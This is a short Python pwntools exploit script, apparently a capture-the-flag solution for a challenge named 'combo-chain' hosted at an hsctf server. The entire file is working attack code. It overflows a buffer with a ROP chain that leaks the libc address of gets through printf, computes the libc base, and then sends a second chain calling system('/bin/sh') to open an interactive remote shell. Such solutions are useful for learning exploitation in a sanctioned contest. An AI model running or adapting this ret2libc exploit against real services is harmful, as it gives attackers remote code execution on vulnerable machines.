from pwn import *
import struct

# r = gdb.debug('./combo-chain')
r = remote('pwn.hsctf.com', 2345)

gets = p64(0x404030)
poprdi = p64(0x0000000000401263)
printf_plt = p64(0x401050)
entry = p64(0x00401080)
nop = p64(0x000000000040101a)

print(r.recvn(0x61))
payload = b''
payload += b'A' * 8
payload += b'B' * 8
payload += poprdi
payload += gets
payload += nop
payload += printf_plt
payload += entry
r.sendline(payload)

leak = r.recv()[-6:] + b'\x00\x00'

print(hex(struct.unpack('<Q', leak)[0]))

gets_libc = 0x00000000006ed80
libc_base = struct.unpack('<Q', leak)[0] - gets_libc
system = libc_base + 0x0000000000045390
binsh = libc_base + 0x18cd57
exit = libc_base + 0x000000000003a030

payload = b''
payload += b'A' * 8
payload += b'B' * 8
payload += poprdi
payload += p64(binsh)
payload += nop
payload += p64(system)
payload += p64(exit)

r.sendline(payload)
r.interactive()
